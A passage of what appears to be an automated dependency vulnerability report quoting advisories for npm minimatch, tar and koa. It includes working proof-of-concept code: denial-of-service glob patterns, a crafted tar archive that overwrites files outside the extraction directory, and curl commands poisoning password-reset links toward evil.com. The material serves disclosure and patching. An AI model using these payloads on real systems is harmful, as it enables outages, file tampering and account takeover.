Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>minimatch</strong> <code>10.2.2</code> (npm)</summary>

<small><code>pkg:npm/minimatch@10.2.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-27904?s=github&n=minimatch&t=npm&vr=%3E%3D10.0.0%2C%3C10.2.3"><img alt="high 7.5: CVE--2026--27904" src="https://img.shields.io/badge/CVE--2026--27904-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=10.0.0<br/><10.2.3</code></td></tr>
<tr><td>Fixed version</td><td><code>10.2.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.

---

### Details

The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:

```typescript
: this.type === '*' && bodyDotAllowed ? `)?`
: `)${this.type}`
```

This produces the following regexps:

| Pattern              | Generated regex                          |
|----------------------|------------------------------------------|
| `*(a\|b)`            | `/^(?:a\|b)*$/`                          |
| `*(*(a\|b))`         | `/^(?:(?:a\|b)*)*$/`                     |
| `*(*(*(a\|b)))`      | `/^(?:(?:(?:a\|b)*)*)*$/`               |
| `*(*(*(*(a\|b))))` | `/^(?:(?:(?:(?:a\|b)*)*)*)*$/`          |

These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.

The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.

Measured times via `minimatch()`:

| Pattern              | Input              | Time       |
|----------------------|--------------------|------------|
| `*(*(a\|b))`         | `a` x30 + `z`      | ~68,000ms  |
| `*(*(*(a\|b)))`      | `a` x20 + `z`      | ~124,000ms |
| `*(*(*(*(a\|b))))` | `a` x25 + `z`      | ~116,000ms |
| `*(a\|a)`            | `a` x25 + `z`      | ~2,000ms   |

Depth inflection at fixed input `a` x16 + `z`:

| Depth | Pattern              | Time         |
|-------|----------------------|--------------|
| 1     | `*(a\|b)`            | 0ms          |
| 2     | `*(*(a\|b))`         | 4ms          |
| 3     | `*(*(*(a\|b)))`      | 270ms        |
| 4     | `*(*(*(*(a\|b))))` | 115,000ms    |

Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- verify the generated regexps and timing (standalone script)**

Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:

```javascript
import { minimatch, Minimatch } from 'minimatch'

function timed(fn) {
  const s = process.hrtime.bigint()
  let result, error
  try { result = fn() } catch(e) { error = e }
  const ms = Number(process.hrtime.bigint() - s) / 1e6
  return { ms, result, error }
}

// Verify generated regexps
for (let depth = 1; depth <= 4; depth++) {
  let pat = 'a|b'
  for (let i = 0; i < depth; i++) pat = `*(${pat})`
  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()
  console.log(`depth=${depth} "${pat}" -> ${re}`)
}
// depth=1 "*(a|b)"          -> /^(?:a|b)*$/
// depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
// depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
// depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/

// Safe-length timing (exponential growth confirmation without multi-minute hang)
const cases = [
  ['*(*(*(a|b)))', 15],   // ~270ms
  ['*(*(*(a|b)))', 17],   // ~800ms
  ['*(*(*(a|b)))', 19],   // ~2400ms
  ['*(*(a|b))',    23],   // ~260ms
  ['*(a|b)',      101],   // <5ms (depth=1 control)
]
for (const [pat, n] of cases) {
  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))
  console.log(`"${pat}" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)
}

// Confirm noext disables the vulnerability
const t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))
console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)

// +() is equally affected
const t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))
console.log(`"+(+(+(a|b)))" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)
```

Observed output:
```
depth=1 "*(a|b)"          -> /^(?:a|b)*$/
depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/
"*(*(*(a|b)))" n=15: 269ms result=false
"*(*(*(a|b)))" n=17: 268ms result=false
"*(*(*(a|b)))" n=19: 2408ms result=false
"*(*(a|b))"    n=23: 257ms result=false
"*(a|b)"       n=101: 0ms result=false
noext=true: 0ms (should be ~0ms)
"+(+(+(a|b)))" n=18: 6300ms result=false
```

**Step 2 -- HTTP server (event loop starvation proof)**

Save as `poc4-server.mjs`:

```javascript
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3001
http.createServer((req, res) => {
  const url     = new URL(req.url, `http://localhost:${PORT}`)
  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern="${pattern}" path="${path.slice(0,30)}"`)
  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
}).listen(PORT, () => console.log(`listening on ${PORT}`))
```

Terminal 1 -- start the server:
```
node poc4-server.mjs
```

Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:
```
curl "http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz" &
```

Terminal 3 -- send a benign request while the attack is in-flight:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz"
```

**Observed output -- Terminal 2 (attack):**
```
{"result":false,"ms":"64149"}
```

**Observed output -- Terminal 3 (benign, concurrent):**
```
{"result":false,"ms":"0"}

time_total: 63.022047s
```

**Terminal 1 (server log):**
```
[2026-02-20T09:41:17.624Z] pattern="*(*(*(a|b)))" path="aaaaaaaaaaaaaaaaaaaz"
[2026-02-20T09:42:21.775Z] done in 64149ms result=false
[2026-02-20T09:42:21.779Z] pattern="*(a|b)" path="aaaz"
[2026-02-20T09:42:21.779Z] done in 0ms result=false
```

The server reports `"ms":"0"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.

Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.

---

### Impact

Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.

Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.

`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).

**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27903?s=github&n=minimatch&t=npm&vr=%3E%3D10.0.0%2C%3C10.2.3"><img alt="high 7.5: CVE--2026--27903" src="https://img.shields.io/badge/CVE--2026--27903-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Inefficient Algorithmic Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=10.0.0<br/><10.2.3</code></td></tr>
<tr><td>Fixed version</td><td><code>10.2.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.045%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.

---

### Details

The vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):

```typescript
while (fr < fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
```

When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).

There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.

Measured timing with n=30 path segments:

| k (globstars) | Pattern size | Time     |
|---------------|--------------|----------|
| 7             | 36 bytes     | ~154ms   |
| 9             | 46 bytes     | ~1.2s    |
| 11            | 56 bytes     | ~5.4s    |
| 12            | 61 bytes     | ~9.7s    |
| 13            | 66 bytes     | ~15.9s   |

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- inline script**

```javascript
import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
```

To scale the effect, increase k:

```javascript
// k=11 -> ~5.4s, k=13 -> ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
```

No special options are required. This reproduces with the default `minimatch()` call.

**Step 2 -- HTTP server (event loop starvation proof)**

The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:

```javascript
// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
```

Terminal 1 -- start the server:
```
node poc1-server.mjs
```

Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:
```
curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &
```

Terminal 3 -- while the attack is in-flight, send a benign request:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"
```

**Observed output (Terminal 3):**
```
{"result":true,"ms":"0"}

time_total: 4.132709s
```

The server reports `"ms":"0"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:

```
{"result":true,"ms":"0"}

time_total: 0.001599s
```

---

### Impact

Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>tar</strong> <code>7.5.7</code> (npm)</summary>

<small><code>pkg:npm/tar@7.5.7</code></small><br/>
<a href="https://scout.docker.com/v/GHSA-qffp-2rhf-9h96?s=github&n=tar&t=npm&vr=%3C%3D7.5.9"><img alt="high 8.2: GHSA--qffp--2rhf--9h96" src="https://img.shields.io/badge/GHSA--qffp--2rhf--9h96-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.9</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.10</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:L/SC:N/SI:H/SA:L</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details
The extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.

What happens with `linkpath: "C:../target.txt"`:
1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.
2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.
3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.
4. Writing through the extracted hardlink overwrites the outside file.

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC
Tested on Arch Linux with `tar@7.5.9`.

PoC script (`poc.cjs`):

```js
const fs = require('fs')
const path = require('path')
const { Header, x } = require('tar')

const cwd = process.cwd()
const target = path.resolve(cwd, '..', 'target.txt')
const tarFile = path.join(process.cwd(), 'poc.tar')

fs.writeFileSync(target, 'ORIGINAL\n')

const b = Buffer.alloc(1536)
new Header({ path: 'l', type: 'Link', linkpath: 'C:../target.txt' }).encode(b, 0)
fs.writeFileSync(tarFile, b)

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'l'), 'PWNED\n')
  process.stdout.write(fs.readFileSync(target, 'utf8'))
})
```

Run:

```bash
cd test-workspace
node poc.cjs && ls -l ../target.txt
```

Observed output:

```text
PWNED
-rw-r--r-- 2 joshuavr joshuavr 6 Mar  4 19:25 ../target.txt
```

`PWNED` confirms outside file content overwrite. Link count `2` confirms the extracted file and `../target.txt` are hardlinked.

### Impact
This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:
- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-26960?s=github&n=tar&t=npm&vr=%3C7.5.8"><img alt="high 7.1: CVE--2026--26960" src="https://img.shields.io/badge/CVE--2026--26960-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><7.5.8</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.8</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.012%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
`tar.extract()` in Node `tar` allows an attacker-controlled archive to create a hardlink inside the extraction directory that points to a file outside the extraction root, using default options.

This enables **arbitrary file read and write** as the extracting user (no root, no chmod, no `preservePaths`).

Severity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive.

### Details
The bypass chain uses two symlinks plus one hardlink:

1. `a/b/c/up -> ../..`
2. `a/b/escape -> c/up/../..`
3. `exfil` (hardlink) -> `a/b/escape/<target-relative-to-parent-of-extract>`

Why this works:

- Linkpath checks are string-based and do not resolve symlinks on disk for hardlink target safety.
  - See `STRIPABSOLUTEPATH` logic in:
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:255`
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:268`
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:281`

- Hardlink extraction resolves target as `path.resolve(cwd, entry.linkpath)` and then calls `fs.link(target, destination)`.
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:566`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:567`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:703`

- Parent directory safety checks (`mkdir` + symlink detection) are applied to the destination path of the extracted entry, not to the resolved hardlink target path.
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:617`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:619`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:27`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:101`

As a result, `exfil` is created inside extraction root but linked to an external file. The PoC confirms shared inode and successful read+write via `exfil`.

### PoC
[hardlink.js](https://github.com/user-attachments/files/25240082/hardlink.js)
Environment used for validation:

- Node: `v25.4.0`
- tar: `7.5.7`
- OS: macOS Darwin 25.2.0
- Extract options: defaults (`tar.extract({ file, cwd })`)

Steps:

1. Prepare/locate a `tar` module. If `require('tar')` is not available locally, set `TAR_MODULE` to an absolute path to a tar package directory.

2. Run:

```bash
TAR_MODULE="$(cd '../tar-audit-setuid - CVE/node_modules/tar' && pwd)" node hardlink.js
```

3. Expected vulnerable output (key lines):

```text
same_inode=true
read_ok=true
write_ok=true
result=VULNERABLE
```

Interpretation:

- `same_inode=true`: extracted `exfil` and external secret are the same file object.
- `read_ok=true`: reading `exfil` leaks external content.
- `write_ok=true`: writing `exfil` modifies external file.

### Impact
Vulnerability type:

- Arbitrary file read/write via archive extraction path confusion and link resolution.

Who is impacted:

- Any application/service that extracts attacker-controlled tar archives with Node `tar` defaults.
- Impact scope is the privileges of the extracting process user.

Potential outcomes:

- Read sensitive files reachable by the process user.
- Overwrite writable files outside extraction root.
- Escalate impact depending on deployment context (keys, configs, scripts, app data).

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>koa</strong> <code>2.16.3</code> (npm)</summary>

<small><code>pkg:npm/koa@2.16.3</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-27959?s=github&n=koa&t=npm&vr=%3C2.16.4"><img alt="high 7.5: CVE--2026--27959" src="https://img.shields.io/badge/CVE--2026--27959-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Input Validation</i>

<table>
<tr><td>Affected range</td><td><code><2.16.4</code></td></tr>
<tr><td>Fixed version</td><td><code>2.16.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.073%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

Koa's `ctx.hostname` API performs naive parsing of the HTTP Host header, extracting everything before the first colon without validating the input conforms to RFC 3986 hostname syntax. When a malformed Host header containing a `@` symbol (e.g., `evil.com:fake@legitimate.com`) is received, `ctx.hostname` returns `evil.com` - an attacker-controlled value. Applications using `ctx.hostname` for URL generation, password reset links, email verification URLs, or routing decisions are vulnerable to Host header injection attacks.

## Details

The vulnerability exists in Koa's hostname getter in `lib/request.js`:

```javascript
// Koa 2.16.1 - lib/request.js
get hostname() {
  const host = this.host;
  if (!host) return '';
  if ('[' === host[0]) return this.URL.hostname || ''; // IPv6 literal
  return host.split(':', 1)[0];
}
```

The `host` getter retrieves the raw header value with HTTP/2 and proxy support:

```javascript
// Koa 2.16.1 - lib/request.js
get host() {
  const proxy = this.app.proxy;
  let host = proxy && this.get('X-Forwarded-Host');
  if (!host) {
    if (this.req.httpVersionMajor >= 2) host = this.get(':authority');
    if (!host) host = this.get('Host');
  }
  if (!host) return '';
  return host.split(',')[0].trim();
}
```

### The Problem

The parsing logic simply splits on the first `:` and returns the first segment. There is no validation that the resulting string is a valid hostname per RFC 3986 Section 3.2.2.

**RFC 3986 Section 3.2.2** defines the host component as:

```
host = IP-literal / IPv4address / reg-name
reg-name = *( unreserved / pct-encoded / sub-delims )
unreserved = ALPHA / DIGIT / "-" / "." / "_" / "~"
sub-delims = "!" / "$" / "&" / "'" / "(" / ")" / "*" / "+" / "," / ";" / "="
```

The `@` character is explicitly NOT permitted in the host component - it is the delimiter separating userinfo from host in the authority component.

### Attack Vector

When an attacker sends:

```
Host: evil.com:fake@legitimate.com:3000
```

Koa parses this as:

| API | Returns | Notes |
|-----|---------|-------|
| `ctx.get('Host')` | `"evil.com:fake@legitimate.com:3000"` | Raw header |
| `ctx.hostname` | `"evil.com"` | **Attacker-controlled** |
| `ctx.host` | `"evil.com:fake@legitimate.com:3000"` | Raw header value |
| `ctx.origin` | `"http://evil.com:fake@legitimate.com:3000"` | Protocol + malformed host |

The `ctx.hostname` API returns `evil.com` because the parser splits on the first `:` without understanding that `evil.com:fake@legitimate.com` is a malformed authority component where `evil.com:fake` would be interpreted as userinfo by a proper URI parser.

### Additional Concern: `ctx.origin`

Koa's `ctx.origin` property concatenates protocol and host without validation:

```javascript
// lib/request.js
get origin() {
  return `${this.protocol}://${this.host}`;
}
```

Applications using `ctx.origin` for URL generation receive the full malformed Host header value, creating URLs with embedded credentials that browsers may interpret as userinfo.

### HTTP/2 Consideration

Koa explicitly checks `httpVersionMajor >= 2` to read the `:authority` pseudo-header:

```javascript
if (this.req.httpVersionMajor >= 2) host = this.get(':authority');
```

The same vulnerability applies - malformed `:authority` values containing userinfo would be accepted and parsed identically.

## PoC

### Setup

```javascript
// server.js
const Koa = require('koa'); 
const app = new Koa();

// Simulates password reset URL generation (common vulnerable pattern)
app.use(async ctx => {
  if (ctx.path === '/forgot-password') {
    const resetToken = 'abc123securtoken';
    const resetUrl = `${ctx.protocol}://${ctx.hostname}/reset?token=${resetToken}`;
    
    ctx.body = {
      message: 'Password reset link generated',
      resetUrl: resetUrl,
      debug: {
        rawHost: ctx.get('Host'),
        parsedHostname: ctx.hostname,
        origin: ctx.origin,
        protocol: ctx.protocol
      }
    };
  }
});

app.listen(3000, () => console.log('Server on http://localhost:3000'));
```

### Exploit

```bash
curl -H "Host: evil.com:fake@localhost:3000" http://localhost:3000/forgot-password
```

### Result

```json
{
  "message": "Password reset link generated",
  "resetUrl": "http://evil.com/reset?token=abc123securtoken",
  "debug": {
    "rawHost": "evil.com:fake@localhost:3000",
    "parsedHostname": "evil.com",
    "origin": "http://evil.com:fake@localhost:3000",
    "protocol": "http"
  }
}
```

The password reset URL points to `evil.com` instead of the legitimate server. In a real attack:

1. Attacker requests password reset for victim's email with malicious Host header
2. Server generates reset link using `ctx.hostname` → `https://evil.com/reset?token=SECRET`
3. Victim receives email with poisoned link
4. Victim clicks link, token is sent to attacker's server
5. Attacker uses token to reset victim's password

### Additional Test Cases

```bash
# Basic injection
curl -H "Host: evil.com:x@legitimate.com" http://localhost:3000/forgot-password
# Result: hostname = "evil.com"

# With port preservation attempt
curl -H "Host: evil.com:443@legitimate.com:3000" http://localhost:3000/forgot-password  
# Result: hostname = "evil.com"

# Unicode/encoded variations
curl -H "Host: evil.com:x%40legitimate.com" http://localhost:3000/forgot-password
# Result: hostname = "evil.com"
```

### Deployment Consideration

For this attack to succeed in production, the malicious Host header must reach the Koa application. This occurs when:

1. **No reverse proxy** - Application directly exposed to internet
2. **Misconfigured proxy** - Proxy doesn't override/validate Host header
3. **Proxy trust enabled** (`app.proxy = true`) - `X-Forwarded-Host` can be injected
4. **Default virtual host** - Server is the catch-all for unrecognized Host headers

## Impact

### Vulnerability Type

- CWE-20: Improper Input Validation
- CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax

### Attack Scenarios

**1. Password Reset Poisoning (High Severity)**
- Attacker hijacks password reset tokens by poisoning reset URLs
- Requires victim to click link in email
- Results in account takeover

**2. Email Verification Bypass**
- Attacker poisons email verification links
- Can verify attacker-controlled email on victim accounts

**3. OAuth/SSO Callback Manipulation**
- Applications using `ctx.hostname` for OAuth redirect URIs
- Attacker redirects OAuth callbacks to malicious server
- Results in token theft

**4. Web Cache Poisoning**
- If responses are cached without Host in cache key
- Poisoned URLs served to all users
- Persistent XSS/phishing via cached responses

**5. Server-Side Request Forgery (SSRF)**
- Internal routing decisions based on `ctx.hostname`
- Attacker manipulates which backend receives requests

### Who Is Impacted

- **Direct impact**: Any Koa application using `ctx.hostname` or `ctx.origin` for URL generation without additional validation
- **Common patterns**: Password reset, email verification, webhook URL generation, multi-tenant routing, OAuth implementations

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>tar</strong> <code>7.5.9</code> (npm)</summary>

